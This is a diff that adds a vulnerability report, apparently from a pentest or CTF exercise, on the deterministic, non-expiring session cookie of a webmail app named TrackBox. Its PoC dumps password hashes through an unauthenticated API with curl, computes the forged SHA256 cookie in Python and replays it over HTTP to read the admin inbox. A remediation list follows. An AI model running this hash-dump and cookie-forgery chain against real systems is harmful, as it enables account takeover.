@@ -1,0 +1,70 @@
+# Description
+
+Deterministic session token (CWE-340 / CWE-330) on the TrackBox webmail. The authentication cookie `Id` is set to `SHA256(f"{username} + {stored_password_hash}")` (`Backend.py:136-140`) at login time — a deterministic value derived from the username and the stored SHA-256 password hash, not a random one. The token never expires server-side (it stays valid until the user's password changes), has no server-side session store, and logout only deletes the client cookie.
+
+The authentication cookie has a client-side lifetime of 20 minutes (`Pages.py:85,141-142,171-172`). Client-side cookie expiration and deletion do not replace server-side session expiration and revocation.
+
+An attacker who obtains the stored password hash (available via the unauthenticated `GET /api/users` endpoint) can compute a valid `Id` cookie without knowing the plaintext password.
+
+# Exploitation
+
+| Step | Action | Result |
+|------|--------|--------|
+| 1 | Dump hashes via `GET /api/users` (unauthenticated). | Obtain the target's `password_hash`. |
+| 2 | Compute `SHA256(f"{username} + {password_hash_tuple}")`. | The victim's `Id` cookie value. |
+| 3 | Send `Id` + `Username` cookies to any authenticated webmail route. | Full session, no plaintext password needed. |
+
+# PoC
+
+**1. Obtain the stored hash from the unauthenticated API:**
+
+```bash
+curl -s "http://webmail.<TARGET>/api/users" | python3 -c "
+import json,sys; d=json.load(sys.stdin)
+for u in d['users']:
+  if u['username']=='admin@tbox.traced': print(u['password_hash'])"
+# <admin_password_hash>
+```
+
+**2. Compute the deterministic token:**
+
+The cookie derivation in `Backend.py:136-140` is `SHA256(f"{username} + {db.get_user_password(username)}")`, where `get_user_password` returns a SQLite row tuple. Replicate that format to forge the `Id` cookie.
+
+```python
+import hashlib
+username = "admin@tbox.traced"
+pw_row = ("<admin_password_hash>",)  # SQLite row tuple
+token = hashlib.sha256(f"{username} + {pw_row}".encode()).hexdigest()
+```
+
+**3. Inject the forged cookies:**
+
+```http
+GET /client HTTP/2
+Host: webmail.<TARGET>
+Cookie: Id=<computed_token>; Username=admin@tbox.traced
+```
+
+Full inbox access confirmed with no plaintext password: the computed value is byte-for-byte the `Id` cookie that `POST /connect` sets for the same account, `GET /client` returns `200` with the victim's inbox (e.g. the admin `Welcome to V.R.C Platform!` mail), while a wrong `Id` returns `302 Location: /connect`.
+
+# Risk
+
+| Dimension | Impact |
+|-----------|--------|
+| Confidentiality | Any user's inbox readable without credentials, including secrets and password-reset links. |
+| Integrity | Admin-inbox access lets the attacker receive the main-app password-reset link (`/account/password-reset-request/` mails it to `admin@tbox.traced`) → admin takeover of the V.R.C platform. The Banking backend has no email-based reset. |
+| Availability | Limited: `/client/settings/change_password` and `/client/settings/delete_account` re-check the current password, so a forged session alone cannot change the password or delete the account (both return `Wrong password.`). |
+
+Overall severity: **Critical** — deterministic, non-expiring token forgeable from the unauthenticated hash dump; chains with the `GET /api/users` finding for password-less session forgery for every account.
+
+# Remediation
+
+1. **Replace the deterministic SHA256 token with a CSPRNG value** generated at login.
+2. **Store sessions server-side** (DB / Redis) bound to the authenticated account.
+3. **Rotate the session ID** on every auth-state change (login, logout, password change).
+4. **Enforce server-side session expiration and revocation**, including idle and absolute timeouts.
+5. **Invalidate server-side sessions on logout and password change.**
+6. **Add regression tests** covering session randomness, expiration, rotation and invalidation.
+
+# Author
+TéléHack
